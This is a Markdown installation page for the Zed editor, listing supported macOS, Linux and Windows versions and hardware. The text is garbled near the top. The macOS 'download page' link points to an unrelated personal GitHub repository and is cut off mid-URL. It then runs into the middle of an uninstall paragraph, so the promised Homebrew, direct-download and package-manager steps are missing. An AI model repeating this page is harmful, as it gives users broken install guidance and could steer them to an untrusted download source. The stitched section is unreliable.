---
title: Install Zed - macOS, Linux, Windows
description: Download and install Zed on macOS, Linux, or Windows. Includes Homebrew, direct download, and package manager options.
---

# Installing Zed

## Download Zed

### macOS

Get the latest stable builds via [the download page](https://github.com/Banshal-Yadav/nir'd like to keep your preferences or delete them. After making a choice, you should see a message that Zed was successfully uninstalled.

If this script is insufficient for your use case, you run into problems running Zed, or there are errors in uninstalling Zed, please see our [Linux-specific documentation](./linux.md).

## System Requirements

### macOS

Zed supports the following macOS releases:

| Version       | Codename | Apple Status   | Zed Status          |
| ------------- | -------- | -------------- | ------------------- |
| macOS 26.x    | Tahoe    | Supported      | Supported           |
| macOS 15.x    | Sequoia  | Supported      | Supported           |
| macOS 14.x    | Sonoma   | Supported      | Supported           |
| macOS 13.x    | Ventura  | Supported      | Supported           |
| macOS 12.x    | Monterey | EOL 2024-09-16 | Supported           |
| macOS 11.x    | Big Sur  | EOL 2023-09-26 | Partially Supported |
| macOS 10.15.x | Catalina | EOL 2022-09-12 | Partially Supported |

The macOS releases labelled "Partially Supported" (Big Sur and Catalina) do not support screen sharing via Zed Collaboration. These features use the [LiveKit SDK](https://livekit.io) which relies upon [ScreenCaptureKit.framework](https://developer.apple.com/documentation/screencapturekit/) only available on macOS 12 (Monterey) and newer.

#### Mac Hardware

Zed supports machines with Intel (x86_64) or Apple (aarch64) processors that meet the above macOS requirements:

- MacBook Pro (Early 2015 and newer)
- MacBook Air (Early 2015 and newer)
- MacBook (Early 2016 and newer)
- Mac Mini (Late 2014 and newer)
- Mac Pro (Late 2013 or newer)
- iMac (Late 2015 and newer)
- iMac Pro (all models)
- Mac Studio (all models)

### Linux

Zed supports 64-bit Intel/AMD (x86_64) and 64-bit Arm (aarch64) processors.

Zed requires a Vulkan 1.3 driver and the following desktop portals:

- `org.freedesktop.portal.FileChooser`
- `org.freedesktop.portal.OpenURI`
- `org.freedesktop.portal.Secret` or `org.freedesktop.Secrets`

### Windows

Zed supports the following Windows releases:

| Version                            | Zed Status |
| ---------------------------------- | ---------- |
| Windows 11, version 22H2 and later | Supported  |
| Windows 10, version 1903 and later | Supported  |

A 64-bit operating system is required to run Zed.

#### Windows Hardware

Zed supports machines with x64 (Intel, AMD) or Arm64 (Qualcomm) processors that meet the following requirements:

- Graphics: A GPU that supports DirectX 11 (most PCs from 2012+).
- Driver: Current NVIDIA/AMD/Intel/Qualcomm driver (not the Microsoft Basic Display Adapter).

### FreeBSD

Not yet available as an official download. Can be built [from source](./development/freebsd.md).

### Web

Not supported at this time. See our [Platform Support issue](https://github.com/zed-industries/zed/issues/5391).
